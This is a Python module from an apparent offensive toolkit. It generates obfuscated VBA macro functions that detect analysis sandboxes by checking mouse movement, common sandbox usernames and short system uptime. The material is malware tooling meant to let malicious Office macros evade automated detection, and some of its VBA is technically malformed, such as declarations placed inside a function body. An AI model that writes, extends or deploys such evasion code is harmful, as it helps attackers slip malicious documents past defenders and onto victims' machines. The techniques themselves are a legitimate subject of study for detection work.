#!/usr/bin/env python3
from ..utils.obfuscation import VBAObfuscator

class SandboxEvasion:
    """VBA sandbox evasion techniques"""
    
    def __init__(self):
        self.obf = VBAObfuscator()
    
    def generate_mouse_check(self):
        """Generate mouse movement detection"""
        func_name = self.obf.random_var()
        var_count = self.obf.random_var()
        var_username = self.obf.random_var()
        
        return f'''
Private Function {func_name}() As Boolean
    ' Check if running in sandbox/VM
    
    ' Check for mouse movement (sandboxes don't simulate this)
    Declare PtrSafe Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
    
    Type POINTAPI
        x As Long
        y As Long
    End Type
    
    Dim pt1 As POINTAPI
    Dim pt2 As POINTAPI
    
    GetCursorPos pt1
    Application.Wait (Now + TimeValue("0:00:03"))
    GetCursorPos pt2
    
    ' If mouse hasn't moved, likely sandbox
    If pt1.x = pt2.x And pt1.y = pt2.y Then
        {func_name} = True
        Exit Function
    End If
    
    ' Check username (sandboxes often use "admin" or "user")
    Dim {var_username} As String
    {var_username} = Environ("USERNAME")
    
    If {var_username} = "admin" Or {var_username} = "user" Or {var_username} = "test" Then
        {func_name} = True
        Exit Function
    End If
    
    {func_name} = False
End Function
'''
    
    def generate_time_check(self):
        """Generate time-based detection"""
        func_name = self.obf.random_var()
        
        return f'''
Private Function {func_name}() As Boolean
    ' Check system uptime (sandboxes are often freshly booted)
    Dim uptime As Long
    uptime = GetTickCount() / 1000 / 60  ' Convert to minutes
    
    If uptime < 10 Then
        {func_name} = True
        Exit Function
    End If
    
    {func_name} = False
End Function
'''